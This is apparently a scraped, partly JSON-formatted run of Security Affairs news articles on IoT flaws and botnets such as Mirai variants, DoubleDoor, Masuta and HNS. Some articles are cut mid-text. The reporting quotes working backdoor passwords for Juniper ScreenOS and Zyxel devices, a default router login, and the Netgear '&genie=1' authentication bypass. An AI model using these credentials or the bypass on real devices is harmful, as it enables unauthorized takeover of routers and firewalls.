In the Internet of Things (IoT) development, the potentially vulnerable points correlate to features \u2014 and the Hanwha SNH-V6410PN/PNW SmartCam has a lot of them.\n\nA few of the features listed on the manufacturer\u2019s website: remote control from your smartphone via wifi, two-way communication via built-in microphone, record video or still images to your smart device, event notification.\n\nAll of these present a potential vulnerability point to be exploited. In the case of this Samsung-branded SmartCam, it looks like all of them are vulnerable as security researcher Kaspersky documented 13 separate vulnerabilities:\n\nThis looks like a lot of vulnerabilities but is not surprising when you have an IoT device that offers a wide range of features like the SmartCam. Combining hardware that acts like a web server, with a cloud server, streaming video and audio and support mobile application creates a lot of places to make mistakes.\n\nBy relying on HTTP instead of encrypted HTTPS, it becomes possible for bad actors to inject their own code into firmware updates as they are downloaded to the cameras or to control the camera and microphone as they choose when controlling the SmartCam via HTTP interface.\n\n\n\nThe developers also missed some very basic account management security controls. Being able to change admin account passwords remotely could allow an attacker to load their own malicious code on the camera to send video to the destination of their choosing, lockout the legitimate user from their hardware, participate in a botnet, even mine for the cryptocurrency.\n\nEven if the camera is hidden behind a firewall, the poorly implemented password controls in the cloud service offer a channel for the bad actors to find and control the camera.\n\nThere is even an interesting attack vector where the attacker \u201cclones\u201d the individual\u2019s camera such that the victim sees the video feed from the attacker\u2019s camera instead of their own. One can imagine a Hollywood movie scene where a security camera feed is replaced with the view from an empty hallway while the criminals walk through the building with impunity.\n\nThese cameras are also subject to the common Denial of Service vulnerabilities often found in IoT devices. There is one unique method that leverages the cloud service in this case. If the bad actor is able to register the camera details first, the legitimate customer will be unable to register and their SmartCam becomes useless.\n\nIn a blog post on March 12, Vladimir Dashchenko confirmed that these vulnerabilities exist \u201cnot only in the camera being researched but all manufacturer\u2019s smart cameras manufactured by Hanwha Techwin. The latter also makes firmware for Samsung cameras.\u201d\n\nFollowing notification from the researcher, Hanwha has started to release firmware updates to fix the vulnerabilities, but this work continues. Details about the fixed vulnerabilities are available from the following CVEs: CVE-2018-6294, CVE-2018-6295, CVE-2018-6296, CVE-2018-6297, CVE-2018-6298, CVE-2018-6299, CVE-2018-6300, CVE-2018-6301, CVE-2018-6302, CVE-2018-6303.\n\nIt is tempting to purchase the solution with the most features for the lowest price because it feels like the best deal. However, getting to the lowest price usually requires compromises and are you getting a deal if the compromises come in features you don\u2019t need?\n\nAbout the author:  Steve Biswanger has over 20 years experience in Information Security consulting, and is a frequent speaker on risk, ICS and IoT topics.

Unlike the older SMETS 1 meters, the UK, SMETS 2 could be used by energy suppliers to remotely receive meter readings electronically.\n\n\n\nThe SMETS 2 smart energy meters were also designed to interoperate with different suppliers, consumers can change the energy provider without needing to change the meters.\n\nAccording to a post published by the Telegraph, the GCHQ has raised concerns over the security of the smart energy meters. Attackers hack them to steal personal details and defraud consumers by tampering with their bills.\n\n\u201cCyber security experts say that making the meters universal will make them more attractive to hackers because the potential returns are so much greater if they can hack every meter using the same software.\u201d states The Telegraph. \n\n\u201cThe cyber criminals are able to artificially inflate meter readings, making bills higher.\n\nThey then try to intercept payments, and if they simply skim off the difference between the real reading and the false reading, energy companies will think the bill has been paid normally.\u201d\n\nThe intelligence agency also warned attackers could use the devices as a \u201cTrojan horse\u201d to enter in the customers\u2019 networks.\n\nThe UK Government also fears that nation-state actors could exploit the flaws in the energy smart meters to create a power surge that would damage the National Grid.\n\nSecurity experts also warn of BlueBorne attacks that potentially expose smart meters to hack by leveraging Bluetooth connections.\n\nRobert Cheesewright, of Smart Energy GB, the Government-funded agency promoting the smart meter roll-out, tried to downplay the risks explaining that no financial data is directly managed by the devices, but evidently, its explanation doesn\u2019t consider different attack scenarios.\n\n\u201cSmart meters are one of the safest and most secure pieces of technology in your home.\u201d said Robert Cheesewright.\n\n\u201cOnly energy data is stored on a meter and this is encrypted. Your name, address, bank account or other financial details are not stored on the meter.\u201d\n\nRisks associated with vulnerable smart meters were already analyzed in the past, in 2014 the security researchers, Javier Vazquez Vidal and Alberto Garcia Illera discovered that millions of Network-connected electricity meters in Spain were are susceptible to cyberattack due to lack of proper security controls.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 smart energy meters, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/gchq", "topic_name": "GCHQ"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/smart-energy-meters", "topic_name": "smart energy meters"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/uk", "topic_name": "UK"}]}, {"news_name": "OMG botnet, the first Mirai variant that sets up proxy servers on vulnerable devices", "news_link": "https://securityaffairs.co/wordpress/69449/malware/omg-botnet.html", "title": "OMG botnet, the first Mirai variant that sets up proxy servers on vulnerable devices\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 23, 2018", "body": "A new variant of the infamous Mirai botnet appeared in the threat landscape, it was discovered by researchers at Fortinet that referred it as OMG because of strings containing \u201cOOMGA\u201d in the configuration table.\n\n\u201cFor this reason, we decided to name this variant OMG.\u201d\u201cThe table, originally encrypted, was decrypted using 0xdeadbeef as the cipher key seed, using the same procedure adopted for the original Mirai. The first thing we noticed are the strings /bin/busybox OOMGA and OOMGA: applet not found.\u201d wrote Fortinet. \n\nThe name Mirai was given to the Mirai bot because of the strings /bin/busybox MIRAI and MIRAI: applet not found, which are commands to determine if it has successfully brute-forced its way into the targeted IoT device. These strings are similar with other variations such as Satori/Okiru, Masuta, etc.\u201d \n\nThe Mirai botnet was first spotted in August 2016 by the security researcher MalwareMustDie, it was specifically designed to compromise vulnerable or poorly protected IoT. Once Mirai malware compromises an IoT device it recruits it into a botnet primarily used for launching DDoS attacks, such as the one that hit Dyn DNS service.\n\nIn October 2016, the Mirai source code was leaked and threat actors in the wild started customizing their Mirai botnet.\n\nThe OMG botnet includes most of Mirai\u2019s features and modules, including the attack, killer, and scanner modules, but also adds new ones.\n\nAccording to Fortinet its configuration includes two strings used to add a firewall rule to ensure traffic on two random ports is allowed.\n\n\u201cThis variant also adds and removes some configurations that can be found in the original Mirai code. Two notable additions are the two strings that are used to add a firewall rule to allow traffic on two random ports, which we will discuss in the latter part of the article.\u201d continues the analysis.\n\n\n\nAfter initialization, OMG connects to the command and control (C&C) server, the configuration table analyzed in the post contains the CnC server string, ccnew.mm.my, which resolves to 188.138.125.235.\n\nThe malware connects to the C&C port 50023, then it sends a defined data message (0x00000000) to the server to identify itself as a new bot.\n\nIn response, the server sends a 5-byte long data string, where the first byte is a command on how the newly recruited device should be used as a proxy server, the two options are:\n\nThe OMG botnet leverages the open source software 3proxy as its proxy server and during the set up phase the bot adds firewall rules to allow traffic on the two random ports.\n\n\u201cThis variant of Mirai uses 3proxy, an open source software, to serve as its proxy server. The set up begins by generating two random ports that will be used for the http_proxy_portand socks_proxy_port. Once the ports are generated, they are reported to the CnC.\u201d continues the analysis. \n\n\u201cFor the proxy to work properly, a firewall rule must be added to allow traffic on the generated ports. As mentioned earlier, two strings containing the command for adding and removing a firewall rule to enable this were added to the configuration table .\u201d\n\nFortinet experts believe the operators behind the OMG botnet sell access to the IoT proxy server, they highlighted that this is the first Mirai variant that sets up proxy servers on vulnerable IoT devices.\n\n\u201cWith this development, we believe that more and more Mirai-based bots are going to emerge with new ways of monetization,\u201d concluded Fortinet.\n\nFurther details, including IoCs are reported in the blog post published by Fortinet.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Mirai , OMG botnet)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mirai", "topic_name": "Mirai"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/omg-botnet", "topic_name": "OMG botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/proxy-server", "topic_name": "proxy server"}]}, {"news_name": "DoubleDoor, a new IoT Botnet bypasses firewall using two backdoor\u00a0exploits", "news_link": "https://securityaffairs.co/wordpress/69063/malware/doubledoor-iot-botney.html", "title": "DoubleDoor, a new IoT Botnet bypasses firewall using two backdoor\u00a0exploits\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 14, 2018", "body": "IoT devices continue to be a privileged target of cyber criminals, cyber attackers against so-called smart objects has seen a rapid evolution. Security researchers at NewSky Security (NewSky Security) have detected a new IoT botnet dubbed DoubleDoor that is able to bypass firewall as well as modem security using two backdoor exploits.\n\nThe analysis of the honeypot logs allowed the researchers to detect the new threat, it leverages two known backdoor exploits to manage two levels of authentications.\n\nThe first malicious code is the Juniper Networks SmartScreen OS exploit, it triggers the flaw CVE-2015\u20137755 to bypass the firewall authentication.\n\nCVE-2015\u20137755 hardcoded backdoor affects the Juniper Networks\u2019 ScreenOS software that powers their Netscreen firewalls.\n\n\u201cEssentially the telnet and SSH daemons of Netscreen firewalls can be accessed by using the hardcoded password <<< %s(un=\u2019%s\u2019) = %u with any username, regardless of it being valid or not.We saw its implementation in the initial attack cycle of DoubleDoor as it attacked our honeypots with username \u201cnetscreen\u201d and the backdoor password.\u201d wrote Ankit Anubhav, Principal Researcher, NewSky Security.\n\nOnce succeeded, the malicious code uses the CVE-2016\u201310401 Zyxel modem backdoor exploit to take full control over the IoT device.\n\nThe code is a privilege escalation exploit, \u201cwhich is why the DoubleDoor attackers also performed a password based attack to get a basic privilege account like admin:CenturyL1nk before going for the superuser.\u201d\n\n\u201cThis time it was CVE-2016\u201310401 , a backdoor for ZyXEL PK5001Z devices. This backdoor is straight forward too, with a hardcoded su password as zyad5001.\u201d continues the expert.\n\n\n\nThe experts highlighted that differently from other IoT botnets like Satori or Masuta, the DoubleDoor botnet doesn\u2019t use a unique string in the reconnaissance phase.\n\n\u201cafter the threat actors have performed the attack, they want a confirmation whether they were successful of getting control of the IoT device. For this, they try to invoke the shell with invalid commands. If the attacker has succeeded, it will show \u201c{string}: applet not found\u201d where {string} is the invalid command.\u201d observed the research.\n\n\u201cDoubleDoor botnet takes care of this, by using a randomized string in every attack\u201d\n\nThe DoubleDoor botnet seems to be in an early stage, most of the attacks are originated from South Korean IPs.\n\nThe botnet includes the code to target a limited number of devices, it will succeed only if the victim has a specific unpatched version of Juniper ScreenOS firewall which protects unpatched Zyxel modems.\n\n\u201cDouble layer of IoT protection is more common in corporate environments, which don\u2019t rely on built-in IoT authentication and like to protect it with another layer of firewall. Although such corporate devices can be lesser in number, getting control of corporate environment routers can be more valuable for an attacker as it can lead to targeted IoT attacks.\u201d concluded the experts.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 DoubleDoor , IoT botnet)\n\n\n\n\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/doubledoor", "topic_name": "DoubleDoor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot-botnet", "topic_name": "IoT botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}]}, {"news_name": "Researcher found multiple vulnerabilities in NETGEAR Routers, update them now!", "news_link": "https://securityaffairs.co/wordpress/68883/hacking/netgear-router-flaws.html", "title": "Researcher found multiple vulnerabilities in NETGEAR Routers, update them now!\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 9, 2018", "body": "Netgear has just released many security updates that address vulnerabilities in a couple of dozen models.\n\nThe vulnerabilities have been reported by security researchers Martin Rakhmanov from Trustwave, which conducted a one-year-study on the firmware running on Netgear\u2019s box.\n\nUsers are recommended to apply the security patches as soon as possible, they can be exploited by hackers to compromise gateways and wireless points.\n\nThe expert discovered that 17 different Netgear routers are affected by a remote authentication bypass that could be exploited by a remote attacker to access target networks without having to provide a password.\n\n\u201cThis also affects large set of products (17 total) and is trivial to exploit. Authentication is bypassed if \u201c&genie=1\u2033 is found within the query string.\u201d reads the analysis published by Rakhmanov.\n\nYes, it\u2019s right, an attacker just needs to append the \u201c&genie=1\u201d the URL to bypass authentication, of course, the attack works against any gateways with remote configuration access enabled.\n\nAttackers can access the device changing its DNS settings to redirect browsers to malicious sites.\n\n\n\nAnother 17 Netgear routers are affected by Password Recovery and File Access vulnerabilities. The flaws reside in the genie_restoring.cgi script used by the Netgear box\u2019s built-in web server, the vulnerability can be triggered to extract files and passwords from its filesystem in flash storage and to pull files from USB sticks plugged into the router.\n\n\u201cSome routers allow arbitrary file reading from the device provided that the path to file is known.

Hackers could even give pleasure to users without their consent using the internet or standing nearby the address within the range of Bluetooth. These are only a few dangers users are exposed once connected to the world of the Internet of Things (IoT).\n\nThe Internet of Things (IoT) is a technology that comprises a myriad of devices connected to the internet and has evolved in such way that is present in many products used in a daily basis, from cars to home utilities. Once taking this into account we see the arising of a new sub-category within the Internet of Things (IoT) named Internet of Dildos (IoD). The Internet of Dildos (IoD) comprehends every device connected to networks that give mankind pleasure. According to the article, the term from 1975 given to this area of research is the following: \u201cTeledildonics (also known as \u201ccyberdildonics\u201d) is technology for remote sex (or, at least, remote mutual masturbation), where tactile sensations are communicated over a data link between the participants\u201d.\n\nThe products from Amor Gummiwaren GmbH that are vulnerable are the following: Vibratissimo Panty Buster, MagicMotion Flamingo, and Realov Lydia. The analysis of researchers focused on Vibratissimo Panty Buster. The panty buster is a sex toy that can be controlled remotely with mobile applications (Android, iOS), but the mobile application, the backend server, hardware, and firmware are developed by third-party company. The application presents many interactive features that enable extensive communication and sharing capabilities, in such a manner that creates a social network where users can expand their experience. Some features are: Search for other users, the creation of friends lists, video chat, message board and sharing of image galleries that can be stored across its social network.\n\nThe vulnerabilities found were: Customer Database Credential Disclosure, Exposed administrative interfaces on the internet, Cleartext Storage of Passwords, Unauthenticated Bluetooth LE Connections, Insufficient Authentication Mechanism, Insecure Direct Object Reference, Missing Authentication in Remote Control and Reflected Cross-Site Scripting. As we start taking a glimpse at the vulnerabilities discovered we can consider the following: All credentials of Vibratissimo database environment were leaked on the internet, alongside with the PHPMyAdmin interface that can have allowed hackers to access the database and dump all content.\n\nThe PHPMyAdmin interface was accessible throughout the URL http://www.vibratissimo.com/phpmyadmin/ with the stored passwords without encryption in clear text format. The content pertained to the database might have the following data: Usernames, Session Tokens, Cleartext passwords, chat histories and explicit image galleries created by the users themselves. The DS_STORE file and config.ini.php was found on the web server of Vibratissimo in such way that hackers could exploit attack vector like directory listing and discover the operating system which in this case is a MAC OSX.\n\nAlso, as disclosed by the researchers, there are great dangers to users in the remote control of the vibrator. The first is related to the connection between the Bluetooth LE of the vibrator and the smartphone application that could lead to eavesdropping, replay and MitM attacks. Although the equipment offers several pairing methods the most dangerous is \u201cno pairing\u201d as noted in the report. This method can allow hackers to search for information on the device as well as write data. If a hacker is in range, he could take control of the device. Also, a man in the middle attack is possible due to the lack of authentication, where a hacker can create a link for itself and then decrement or increment the ID to get direct access to the link used by the person. Due to the lack of authentication, a reflected cross-site scripting is also possible, but as noticed by the researchers it is not as dangerous as the other security issues.\n\nLast but not least the researchers recommend a complete update in the software and mobile application used by the devices. It is highly recommended for all users to change their login information as well as their passwords for greater protection.

The botnet uses hosted servers to find and infect new victims leveraging one of two known vulnerabilities that have become popular in IoT botnets recently:\n\n\n\u201cBoth exploit vectors are known from the Satori botnet and based on code that was part of a recent public Pastebin post by the \u201cJanit0r,\u201d author of \u201cBrickerBot.\u201d\n\nJenX also implemented some techniques used by the recently discovered PureMasuta botnet.\n\nThe command-and-control server is hosted at the site San Calvicie, which offers multiplayer mod support for Grand Theft Auto: San Andreas, and also DDoS-for-hire service.\n\nJenX is a DDoS botnet, the DDoS  option offered by San Calvicie is called \u201cCorriente Divina.\u201d\n\nThe users of the website can rent a GTA San Andreas multiplayer modded server for $16 and a Teamspeak server goes for $9. Adding $20 it is possible to power massive DDoS attacks that can peak 290 and 300 Gbps.\n\n\u201cThe Corriente Divina (\u2018divine stream\u2019) option is described as \u2018God\u2019s wrath will be employed against the IP that you provide us,\u201d wrote Radware\u2019s Cyber Security expert Pascal Geenens. \u201cIt provides a DDoS service with a guaranteed bandwidth of 90-100 Gbps and attack vectors including Valve Source Engine Query and 32 bytes floods, TS3 scripts and a \u2018Down OVH\u2019 option which most probably refers to attacks targeting the hosting service of OVH, a cloud hosting provider that also was a victim of the original Mirai attacks back in September 2016. OVH is well known for hosting multi-player gaming servers such as Minecraft, which was the target of the Mirai attacks at the time.\u201d\n\n\n\nDifferently from Satori and PureMasuta botnets, JenX has a centralized infrastructure, it uses a central server to perform the scanning of new hosts.\n\n\u201cThe drawback of the central approach is a less than linear growth with the number of deployed servers. Much slower compared to the exponential growth rate of and less aggressive than distributed scanning botnets,\u201d continues the analysis.\n\nThe presence of a central server that coordinates the activity makes it easy for law enforcement and security firms to take down the botnet. Of course, threat actors can deploy the control server to the Dark Web making hard take over from law enforcement.\n\nEven if the JenX is able to power massive DDoS attacks, for now, is doesn\u2019t represent a  serious threat because it aims to disrupt services from competing for GTA SA multiplayer servers.\n\n\u201cThe botnet is supposed to serve a specific purpose and be used to disrupt services from competing GTA SA multiplayer servers. I do not believe that this will be the botnet that will take down the internet,\u201d Geenens concluded.\n\n\u201cBut it does contain some interesting new evolutions and it adds to a list of IoT botnets that is growing longer and faster every month! That said, there is nothing that stops one from using the cheap $20 per target service to perform 290Gbps attacks on business targets and even government related targets. I cannot believe the San Calvicie group would oppose to it.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 JenX botnet, IoT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/grand-theft-auto", "topic_name": "Grand Theft Auto"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/jenx-botnet", "topic_name": "JenX botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/puremasuta", "topic_name": "PureMasuta"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/satori", "topic_name": "satori"}]}, {"news_name": "Three Dutch banks and Tax Agency under DDoS Attacks \u2026 is it a Russian job?", "news_link": "https://securityaffairs.co/wordpress/68428/hacking/dutch-banks-ddos.html", "title": "Three Dutch banks and Tax Agency under DDoS Attacks \u2026 is it a Russian job?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 30, 2018", "body": "Early this week a massive DDoS attack targeted three Dutch banks, ABN AMRO, ING Bank, Rabobank, and the Dutch Taxation Authority (Belastingdienst).\n\nThe DDoS attacks caused severe accessibility problems to the bank infrastructure, they prevented customers from accessing the web services.\n\nThe attack against the Dutch Tax Authority prevented taxpayers filing tax-related documents.\n\n\n\nWho is behind the attack?\n\nAccording to security experts from ESET, the origins of the attacks are servers in Russia.\n\n\u201cThe DDoS attacks that hit ABN Amro, ING and Rabobank over the weekend and on Monday, came from servers in Russia, according to security company ESET.

The bot, dubbed HNS, was intercepted by our IoT honeypot system following a credentials dictionary attack on the Telnet service.\u201d states the analysis from Bitdefender.\n\n\u201cThe samples identified in our honeypots on Jan. 10 revolved around IP cameras manufactured by a Korean company. These devices seemed to play a major role in the botnet as, out of the 12 IP addresses hardcoded in the sample, 10 used to belong to Focus H&S devices. The new version, observed on Jan. 20, dropped the hardcoded IPs.\u201d\n\nRecently security experts spotted other IoT botnets, most of them linked to the Mirai botnet, such as Satori, Okiru, and Masuta, but the HNS botnet has a different genesis and doesn\u2019t share the source code.\n\nResearchers at Bitdefender found similarities between the HNS and the Hajime botnets, unlike Mirai, Hajime doesn\u2019t use C&C servers, instead, it implements a peer-to-peer network.\n\nHajime is more sophisticated than Mirai, it implements more mechanisms to hide its activity and running processes and its modular structure allows operators to add new capabilities on the fly.\n\n\u201cIt is the second known IoT botnet to date, after the notorious Hajime botnet, that has a decentralized, peer-to-peer architecture,\u201d states Bitdefender. \u201cHowever, if in the case of Hajime, the P2P functionality was based on the BitTorrent protocol, here we have a custom-built P2P communication mechanism.\u201d\n\nThe HNS malware is able to infect a series of IoT devices using the exploit as Reaper, the current version is able to receive and execute several types of commands, such as data exfiltration, code execution and interference with a device\u2019s operation.\n\nAccording to the experts, the botnet is still under development, it doesn\u2019t include DDoS capabilities, a circumstance that suggests it is intended to be deployed as a proxy network.\n\n\u201cWhile IoT botnets have been around for years, mainly used for DDoS attacks, the discoveries made during the investigation of the Hide and Seek bot reveal greater levels of complexity and novel capabilities such as information theft \u2013 potentially suitable for espionage or extortion.\u201d concluded Bitdefender.\n\n\u201cIt is also worth noting that the botnet is undergoing constant redesign and rapid expansion.\u201d\n\nThe bot spread by randomly generates a list of IP addresses that could be potentially compromised. It then initiates a raw socket SYN connection to each potential target and continues communication with those devices that answer the request on specific destination ports (23 2323, 80, 8080).\n\nOnce the bot has established a connection it will look for a specific banner (\u201cbuildroot login:\u201d) presented by the victim. If it gets this login banner, it attempts to log in using a list of default credentials. If the credentials are not correct, the botnet launches a dictionary attack using a hardcoded list.\n\nOnce connected to the victim, the malware will run through a \u201cstate machine\u201d to determine the type of target device and select the most suitable compromise method. Experts explained that if the device shares the same network with the bot, the bot sets up TFTP server to allow the victim to download the malicious code from the bot. If the victim is located on the internet, the bot will attempt to use a specific remote payload delivery method to get the target device to download and execute the sample.\n\n\u201cThese exploitation techniques are preconfigured and are located in a memory location that is digitally signed to prevent tampering. This list can be updated remotely and propagated among infected hosts.\u201d continues the analysis.\n\nExperts observed that the HNS botnet cannot establish persistence on infected devices, once the device restart, the malware will be removed, this means that botnet operators have to continuously manage the HNS botnet.\n\nLet\u2019s monitor the growth of the new-born botnet.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 HNS botnet, malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hns-botnet", "topic_name": "HNS botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/thingbot", "topic_name": "ThingBot"}]}, {"news_name": "Satori\u2019s threat actors are behind the new Masuta botnet that is targeting routers in the wild", "news_link": "https://securityaffairs.co/wordpress/68153/malware/masuta-botnet.html", "title": "Satori\u2019s threat actors are behind the new Masuta botnet that is targeting routers in the wild\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 24, 2018", "body": "Security experts at NewSky\u2019s believe the operators of the recently discovered Satori botnet are launching a new massive hacking campaign against routers to infect and recruit them in the botnet.\n\n\u201cWe analyzed two variants of an IoT botnet named \u201cMasuta\u201d where we observed the involvement of a well-known IoT threat actor and discovered a router exploit being weaponized for the first time in a botnet campaign.\u201d reads the analysis published by NewSky.\n\n\u201cWe were able to get hands on the source code of Masuta (Japanese for \u201cmaster\u201d) botnet in an invite only dark forum. After analyzing the configuration file., we saw that Masuta uses 0xdedeffba instead of Mirai\u2019s 0xdeadbeef as the seed of the cipher key, hence the strings in the configuration files were effectively xored by ((DE^DE)^FF) ^BA or 0x45.\u201d\n\nThe Satori botnet is a variant of the Mirai botnet first discovered by the group of experts MalwareMustDie, it made the headlines at the end of 2016 when it was involved in hundreds of thousands of attempts to exploit a recently discovered vulnerability in Huawei HG532 home routers.\n\nMasuta also targets routers using default credentials, one of the versions analyzed by the experts dubbed \u201cPureMasuta\u201d relies on the old network administration EDB 38722 D-Link exploit.\n\nResearchers noticed a rise in the Masuta attacks since September, their honeypots observed 2400 IPs involved in the botnet in last three months and experts believe that other routers will be recruited in the next months.\n\n\n\nThe flaw triggered by the EDB 38722 D-Link exploit was discovered in 2015 by the researchers Craig Heffner, it affects the D-Link\u2019s Home Network Administration Protocol.\n\n\u201cThe weaponized bug introduced in PureMasuta botnet is in the HNAP (Home Network Administration Protocol) which itself is based on the SOAP protocol.\u201d continues the analysis published by NewSky.\n\n\u201cIt is possible to craft a SOAP query which can bypass authentication by using hxxp://purenetworks.com/HNAP1/GetDeviceSettings. Also, it is feasible to run system commands (leading to arbitrary code execution) because of improper string handling. When both issues are combined, one can form a SOAP request which first bypasses authentication, and then causes arbitrary code execution.\u201d\n\nThe experts explained that a string like the following one will cause a reboot.\n\nAn attacker can run any command inserted after \u2018GetDeviceSettings\u2019, this mechanism is used by the PureMasuta bot to run a wget to fetch and run a shell script and take over the target router.\n\nThe experts noticed that the command and control server (93.174.93.63) used by PureMasuta variant is the same as used in the original Masuta variants, this means that PureMasuta is an evolution of the botnet operated by the same threat actors.\n\nNewSky attributes the Masuta botnet to an entity dubbed \u201cNexus Zeta\u201d, the name comes from the C&C URL nexusiotsolutions(dot)net, this URL is the same used by the Satori botnet.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Masuta botnet, Satori botnet)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/masuta-botnet", "topic_name": "Masuta botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/puremasuta", "topic_name": "PureMasuta"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/satori-botnet", "topic_name": "satori botnet"}]}, {"news_name": "Mirai\u00a0Okiru botnet targets for first time ever in the history ARC-based IoT devices", "news_link": "https://securityaffairs.co/wordpress/67742/malware/mirai-okiru-botnet.html", "title": "Mirai\u00a0Okiru botnet targets for first time ever in the history ARC-based IoT devices\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 14, 2018", "body": "In August 2016 the researcher @unixfreaxjp from @MalwareMustDie team first spotted the dreaded Mirai botnet, now the same researcher is announcing a new big earthquake in the malware community.\n\nunixfreaxjp spotted the first time ever in the history of computer engineering a Linux malware designed to infect ARC CPU, this new Linux ELF malware was dubbed MIRAI OKIRU.\n\nThis is the first time that a malware specifically targets ARC-based systems, the Mirai Okiru was undetected by almost all the antivirus engines at the time of its discovery.\n\n\n\n\u201c!!

These systems are responsible for the control and operation of critical services like clean water and energy respectively. Researchers of IOACTIVE released a report analyzing the impact on the security of SCADA-ICS systems operating connected to the internet of things (IoT) and mobile applications.\n\nThe report states that mobile applications are present in many ICS segments and can be divided into two groups, Local (Wi-Fi, Bluetooth) and remote applications (Internet, VPN), which are exposed to three types of attacks such as Unauthorized physical access to the device or \u201cvirtual\u201d access to device data, Communication channel compromise (MiTM), Application compromise.\n\n\n\nConsidering these attacks mobile SCADA applications can lead to Directly/indirectly influencing an industrial process or industrial network infrastructure and compromising an operator to unwillingly perform a harmful action on the system.\n\nThe research was conducted based on OWASP 2016 and analyzed 34 vendors that released the app on Google Play Store. The mobile app analyzed revealed that 147 security issues were identified related to secure coding programming that would allow code tampering.\n\nThe researchers noticed that hackers could gain remote control to smartphones to further launch attacks on ICS vulnerable app used on hardware and software. Also, the researchers pointed out that there was an increase of 16 vulnerabilities per application.\n\nRegarding the vulnerabilities, researchers found out that insecure authorization was present with some apps failing to include any form of authentication. Other vulnerabilities live reverse engineering were present due to the absence of code obfuscation. insecure data storage and unintended data leakage were present which could allow hackers to access the app or data related to \u2018Supervisory Control And Data Acquisition\u2019 system.\n\nThe security of society is at stake since these new vulnerabilities pose a great threat, even more than the damage caused by the 2016 Ukrainian attack. The report recommends to app developers to consider secure coding in the development planning due to the impacts on society that these flaws represent.\n\nAbout the author Luis Nakamoto\n\nLuis Nakamoto is a Computer Science student of Cryptology and a enthusiastic of information security having participated in groups like Comiss\u00e3o Especial de Direito Digital e Compliance (OAB/SP) and CCBS (Consci\u00eancia Cibern\u00e9tica Brasil) as a researcher in new technologies related to ethical hacking, forensics and reverse engineering.

